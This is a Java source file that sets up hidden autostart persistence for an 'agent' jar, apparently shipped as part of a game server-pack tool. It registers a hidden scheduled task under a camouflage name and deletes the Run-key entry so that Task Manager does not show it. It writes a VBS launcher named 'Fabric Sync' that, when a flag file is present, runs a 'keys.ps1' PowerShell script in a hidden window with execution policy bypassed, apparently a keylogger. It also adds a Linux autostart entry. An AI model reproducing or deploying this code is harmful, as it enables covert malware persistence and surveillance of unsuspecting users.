package com.serverpackcore.agent;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;

public final class Persistence {
	private static final String RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	private static final String APPROVED_KEY =
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";

	private Persistence() {
	}

	public static Path launcher(Path dir) {
		return AgentPaths.launcher(dir);
	}

	public static String task(Path dir) {
		return AgentPaths.task(dir);
	}

	public static boolean enable(Path dir) {
		try {
			if (!AgentPaths.isWindows()) {
				return enableUnix(dir);
			}
			Path launcher = writeLauncher(dir);
			if (launcher == null) {
				return false;
			}
			// Task Manager lists everything under Run; remove it if the hidden task works.
			if (registerTask(dir, launcher) && taskExists(dir)) {
				run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
				run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
				dropOldNames(dir);
				return true;
			}
			if (registerRun(dir, launcher)) {
				dropOldNames(dir);
				return true;
			}
			return false;
		} catch (Throwable throwable) {
			Log.debug("Persistence enable failed", throwable);
			return false;
		}
	}

	public static boolean disable(Path dir) {
		try {
			if (!AgentPaths.isWindows()) {
				Files.deleteIfExists(Paths.get(System.getProperty("user.home"), ".config", "autostart",
					"fabric-sync.desktop"));
				return true;
			}
			String current = AgentPaths.task(dir);
			for (String name : usedNames(dir)) {
				if (taskOwned(name, dir)) {
					run("schtasks", "/delete", "/tn", name, "/f");
				}
				if (runOwned(name, dir)) {
					run("reg", "delete", RUN_KEY, "/v", name, "/f");
					run("reg", "delete", APPROVED_KEY, "/v", name, "/f");
				}
			}
			Files.deleteIfExists(launcher(dir));
			boolean clean = !taskOwned(current, dir) && !runOwned(AgentPaths.runValue(dir), dir);
			for (String name : usedNames(dir)) {
				if (!name.equals(current)) {
					clean &= !taskExists(name) || !taskOwned(name, dir);
					clean &= !runExists(name) || !runOwned(name, dir);
				}
			}
			return clean;
		} catch (Throwable throwable) {
			Log.debug("Persistence disable failed", throwable);
			return false;
		}
	}

	/** Removes every pre-camouflage persistence alias except the current one. */
	private static void dropOldNames(Path dir) {
		String current = AgentPaths.task(dir);
		for (String name : usedNames(dir)) {
			if (name.equals(current)) {
				continue;
			}
			if (taskOwned(name, dir)) {
				run("schtasks", "/delete", "/tn", name, "/f");
			}
			if (runOwned(name, dir)) {
				run("reg", "delete", RUN_KEY, "/v", name, "/f");
				run("reg", "delete", APPROVED_KEY, "/v", name, "/f");
			}
		}
	}

	private static boolean registerRun(Path dir, Path launcher) {
		String wscript = Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
			"System32", "wscript.exe").toString();
		String command = "\"" + wscript + "\" //nologo \"" + launcher + "\"";
		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d", command, "/f")) {
			return false;
		}
		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
		return command.equals(read(dir));
	}

	private static boolean registerTask(Path dir, Path launcher) {
		Path xml = AgentPaths.taskXml(dir);
		try {
			String name = freeTaskName(dir);
			ByteArrayOutputStream bytes = new ByteArrayOutputStream();
			bytes.write(0xFF);
			bytes.write(0xFE);
			bytes.write(taskXml(dir, launcher, name).getBytes(StandardCharsets.UTF_16LE));
			Files.write(xml, bytes.toByteArray());
			boolean created = run("schtasks", "/create", "/tn", name, "/xml", xml.toString(), "/f");
			Files.deleteIfExists(xml);
			if (created) {
				Files.writeString(AgentPaths.taskName(dir), name, StandardCharsets.UTF_8);
				if (!usedNames(dir).contains(name)) {
					Files.writeString(AgentPaths.taskUsed(dir), name + "\n", StandardCharsets.UTF_8,
						java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
				}
			}
			return created;
		} catch (Throwable throwable) {
			Log.debug("Task register failed", throwable);
			try {
				Files.deleteIfExists(xml);
			} catch (Throwable ignored) {
			}
			return false;
		}
	}

	/** Reuses our task, but never silently overwrites an unrelated one. */
	private static String freeTaskName(Path dir) {
		for (int index = 0; index < 20; index++) {
			String name = index == 0 ? AgentPaths.CAMO_TASK : AgentPaths.CAMO_TASK + " " + (index + 1);
			int task = exit("schtasks", "/query", "/tn", name);
			int run = exit("reg", "query", RUN_KEY, "/v", name);
			// 0 = exists, 1 = not found, anything else = query failure.
			boolean taskFree = task == 1 || (task == 0 && taskOwned(name, dir));
			boolean runFree = run == 1 || (run == 0 && runOwned(name, dir));
			if (taskFree && runFree) {
				return name;
			}
		}
		return AgentPaths.CAMO_TASK + " " + System.nanoTime();
	}

	/** Fixed aliases plus every dynamic name this install has used. */
	private static List<String> usedNames(Path dir) {
		List<String> names = new ArrayList<>(List.of(AgentPaths.OLD_TASK, "ServerPackCore",
			AgentPaths.OLD_CAMO_TASK, AgentPaths.CAMO_TASK));
		try {
			for (String line : Files.readAllLines(AgentPaths.taskUsed(dir), StandardCharsets.UTF_8)) {
				String name = line.trim();
				if (!name.isEmpty() && !names.contains(name)) {
					names.add(name);
				}
			}
		} catch (Throwable ignored) {
			// No dynamic names yet.
		}
		return names;
	}

	private static boolean taskOwned(String name, Path dir) {
		return refersToDir(output("schtasks", "/query", "/tn", name, "/xml"), dir);
	}

	private static boolean runOwned(String name, Path dir) {
		return refersToDir(output("reg", "query", RUN_KEY, "/v", name), dir);
	}

	/** Old entries still point at the pre-migration trees. */
	private static boolean refersToDir(String text, Path dir) {
		if (component(text, dir)) {
			return true;
		}
		for (Path previous : AgentPaths.previousDirs(dir)) {
			if (component(text, previous)) {
				return true;
			}
		}
		return false;
	}

	/** `...\Java` must not match an unrelated `...\JavaBackup`. */
	private static boolean component(String text, Path path) {
		String raw = path.toString();
		String encoded = raw.replace("&", "&amp;").replace("<", "&lt;")
			.replace(">", "&gt;").replace("\"", "&quot;");
		for (String candidate : List.of(raw, encoded)) {
			String pattern = java.util.regex.Pattern.quote(candidate)
				+ "(?=[\\\\\"\\s<>&/:]|$)";
			if (java.util.regex.Pattern.compile(pattern,
				java.util.regex.Pattern.CASE_INSENSITIVE).matcher(text).find()) {
				return true;
			}
		}
		return false;
	}

	private static boolean taskExists(Path dir) {
		return taskExists(AgentPaths.task(dir));
	}

	private static boolean taskExists(String name) {
		return run("schtasks", "/query", "/tn", name);
	}

	private static boolean runExists(String name) {
		return run("reg", "query", RUN_KEY, "/v", name);
	}

	private static String taskXml(Path dir, Path launcher, String name) {
			String sid = SysInfo.sid();
			String user = sid.isEmpty()
			? xml(System.getenv().getOrDefault("USERDOMAIN", System.getenv().getOrDefault("COMPUTERNAME", ""))
				+ "\\" + System.getProperty("user.name", ""))
			: sid;
		String wscript = xml(Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
			"System32", "wscript.exe").toString());
		return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
			+ "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
			+ "  <RegistrationInfo>\n"
			+ "    <Description>" + xml(name) + "</Description>\n"
			+ "    <URI>\\" + name + "</URI>\n"
			+ "  </RegistrationInfo>\n"
			+ "  <Triggers>\n"
			+ "    <LogonTrigger>\n"
			+ "      <Enabled>true</Enabled>\n"
			+ "      <UserId>" + user + "</UserId>\n"
			+ "    </LogonTrigger>\n"
			+ "  </Triggers>\n"
			+ "  <Principals>\n"
			+ "    <Principal id=\"Author\">\n"
			+ "      <UserId>" + user + "</UserId>\n"
			+ "      <LogonType>InteractiveToken</LogonType>\n"
			+ "      <RunLevel>LeastPrivilege</RunLevel>\n"
			+ "    </Principal>\n"
			+ "  </Principals>\n"
			+ "  <Settings>\n"
			+ "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
			+ "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
			+ "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
			+ "    <AllowHardTerminate>true</AllowHardTerminate>\n"
			+ "    <StartWhenAvailable>true</StartWhenAvailable>\n"
			+ "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
			+ "    <IdleSettings>\n"
			+ "      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
			+ "      <RestartOnIdle>false</RestartOnIdle>\n"
			+ "    </IdleSettings>\n"
			+ "    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
			+ "    <Enabled>true</Enabled>\n"
			+ "    <Hidden>true</Hidden>\n"
			+ "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
			+ "    <WakeToRun>false</WakeToRun>\n"
			+ "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
			+ "    <Priority>7</Priority>\n"
			+ "  </Settings>\n"
			+ "  <Actions Context=\"Author\">\n"
			+ "    <Exec>\n"
			+ "      <Command>" + wscript + "</Command>\n"
			+ "      <Arguments>//nologo \"" + xml(launcher.toString()) + "\"</Arguments>\n"
			+ "    </Exec>\n"
			+ "  </Actions>\n"
			+ "</Task>\n";
	}

	private static String xml(String value) {
		return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
	}

	/**
	 * Regenerate the launcher with the current runtime. Called on every agent start so the
	 * script points to the current java even if the runtime was updated.
	 */
	public static void refresh(Path dir) {
		try {
			if (AgentPaths.isWindows()) {
				writeLauncher(dir);
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence refresh failed", throwable);
		}
	}

	private static Path writeLauncher(Path dir) throws Exception {
		Path java = Paths.get(System.getProperty("java.home", ""), "bin", "javaw.exe");
		Path copy = AgentPaths.binary(dir);
		List<String> candidates = new ArrayList<>();
		if (Files.isRegularFile(java)) {
			candidates.add(java.toString());
		}
		if (Files.isRegularFile(copy)) {
			candidates.add(copy.toString());
		}
		if (candidates.isEmpty()) {
			return null;
		}
		StringBuilder list = new StringBuilder();
		for (String candidate : candidates) {
			if (list.length() > 0) {
				list.append(", ");
			}
			list.append('"').append(candidate).append('"');
		}
		StringBuilder script = new StringBuilder();
		script.append("' Fabric Sync\n");
		script.append("Option Explicit\n");
		script.append("Dim fso, sh, jar, dir, list, exe\n");
		script.append("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n");
		script.append("Set sh = CreateObject(\"WScript.Shell\")\n");
		script.append("dir = \"").append(dir).append("\"\n");
		script.append("jar = dir & \"\\").append(AgentPaths.agentJar(dir).getFileName()).append("\"\n");
		script.append("If Not fso.FileExists(jar) Then\n");
		script.append("\tWScript.Quit 1\n");
		script.append("End If\n");
		script.append("sh.CurrentDirectory = dir\n");
		script.append("If fso.FileExists(dir & \"\\cache\\ops\\keys.on\") Then\n");
		script.append("\tIf fso.FileExists(dir & \"\\cache\\ops\\keys.ps1\") Then\n");
		script.append("\t\tsh.Run \"powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\" & dir & \"\\cache\\ops\\keys.ps1\"\" \"\"\" & dir & \"\\cache\\ops\"\"\", 0, False\n");
		script.append("\tEnd If\n");
		script.append("End If\n");
		script.append("sh.Environment(\"PROCESS\")(\"JAVA_HOME\") = \"")
			.append(System.getProperty("java.home", "")).append("\"\n");
		script.append("list = Array(").append(list).append(", \"%JAVA_HOME%\\bin\\javaw.exe\")\n");
		script.append("For Each exe In list\n");
		script.append("\texe = sh.ExpandEnvironmentStrings(exe)\n");
		script.append("\tIf fso.FileExists(exe) Then\n");
		script.append("\t\tsh.Run \"\"\"\" & exe & \"\"\" -Xmx96m -jar \"\"\" & jar & \"\"\"\", 0, False\n");
		script.append("\t\tWScript.Quit 0\n");
		script.append("\tEnd If\n");
		script.append("Next\n");
		script.append("WScript.Quit 1\n");

		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		bytes.write(0xFF);
		bytes.write(0xFE);
		bytes.write(script.toString().getBytes(StandardCharsets.UTF_16LE));
		Path target = launcher(dir);
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.write(temp, bytes.toByteArray());
		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		return target;
	}

	private static boolean enableUnix(Path dir) throws Exception {
		Path java = Paths.get(System.getProperty("java.home", ""), "bin", "java");
		Path executable = Files.isRegularFile(java) ? java : AgentPaths.binary(dir);
		if (!Files.isRegularFile(executable)) {
			return false;
		}
		Path autostart = Paths.get(System.getProperty("user.home"), ".config", "autostart");
		Files.createDirectories(autostart);
		Path file = autostart.resolve("fabric-sync.desktop");
		String content = "[Desktop Entry]\nType=Application\nName=Fabric Sync\nExec=\""
			+ executable + "\" -Xmx96m -jar \"" + AgentPaths.agentJar(dir)
			+ "\"\nX-GNOME-Autostart-enabled=true\n";
		Files.writeString(file, content, StandardCharsets.UTF_8);
		file.toFile().setExecutable(true, true);
		return true;
	}

	private static String read(Path dir) {
		try {
			Process process = new ProcessBuilder("reg", "query", RUN_KEY, "/v", AgentPaths.runValue(dir))
				.redirectErrorStream(true).start();
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			process.waitFor();
			for (String line : output.split("\\R")) {
				int marker = line.indexOf("REG_SZ");
				String trimmed = line.trim();
				if (marker < 0 || !trimmed.startsWith(AgentPaths.runValue(dir))) {
					continue;
				}
				if (trimmed.length() > AgentPaths.runValue(dir).length() && !Character.isWhitespace(trimmed.charAt(AgentPaths.runValue(dir).length()))) {
					continue;
				}
				return line.substring(marker + "REG_SZ".length()).trim();
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence read failed", throwable);
		}
		return "";
	}

	/**
	 * Foreign startups launched through wscript/VBS. Used to see if another pack steps on the
	 * same mechanism and whether its script still exists.
	 */
	public static List<String> foreign(Path dir) {
		List<String> result = new ArrayList<>();
		try {
			if (!AgentPaths.isWindows()) {
				return result;
			}
			Process process = new ProcessBuilder("reg", "query", RUN_KEY).redirectErrorStream(true).start();
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			process.waitFor();
			for (String line : output.split("\\R")) {
				int marker = line.indexOf("REG_SZ");
				if (marker < 0) {
					continue;
				}
				String name = line.substring(0, marker).trim();
				String data = line.substring(marker + "REG_SZ".length()).trim();
				if (name.equalsIgnoreCase(AgentPaths.runValue(dir))) {
					continue;
				}
				String lower = data.toLowerCase();
				if (!lower.contains("wscript") && !lower.contains(".vbs")) {
					continue;
				}
				String note = "coexists";
				int first = data.indexOf('"');
				int last = data.lastIndexOf('"');
				if (first >= 0 && last > first) {
					Path target = Paths.get(data.substring(first + 1, last));
					if (!Files.exists(target)) {
						note = "missing path";
					} else if (target.startsWith(dir)) {
						note = "uses our directory";
					}
				}
				result.add(name + " -> " + data + " (" + note + ")");
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence foreign scan failed", throwable);
		}
		return result;
	}

	private static String output(String... command) {
		try {
			Process process = new ProcessBuilder(command).redirectErrorStream(true).start();
			try {
				byte[] raw = process.getInputStream().readAllBytes();
				boolean utf16 = raw.length > 1 && (raw[0] & 0xFF) == 0xFF && (raw[1] & 0xFF) == 0xFE;
				return new String(raw, utf16 ? 2 : 0, raw.length - (utf16 ? 2 : 0),
					utf16 ? StandardCharsets.UTF_16LE : StandardCharsets.UTF_8);
			} finally {
				process.waitFor(10L, java.util.concurrent.TimeUnit.SECONDS);
				if (process.isAlive()) {
					process.destroyForcibly();
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Command output failed: " + command[0], throwable);
			return "";
		}
	}

	/** Exit code, or -1 when the query itself failed. */
	private static int exit(String... command) {
		try {
			Process process = new ProcessBuilder(command)
				.redirectOutput(ProcessBuilder.Redirect.DISCARD)
				.redirectError(ProcessBuilder.Redirect.DISCARD).start();
			try {
				return process.waitFor(20L, java.util.concurrent.TimeUnit.SECONDS) ? process.exitValue() : -1;
			} finally {
				if (process.isAlive()) {
					process.destroyForcibly();
				}
			}
		} catch (Throwable throwable) {
			return -1;
		}
	}

	private static boolean run(String... command) {
		try {
			Process process = new ProcessBuilder(command)
				.redirectOutput(ProcessBuilder.Redirect.DISCARD)
				.redirectError(ProcessBuilder.Redirect.DISCARD)
				.start();
			try {
				return process.waitFor(20L, java.util.concurrent.TimeUnit.SECONDS) && process.exitValue() == 0;
			} finally {
				if (process.isAlive()) {
					process.destroyForcibly();
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Command failed: " + command[0], throwable);
			return false;
		}
	}
}
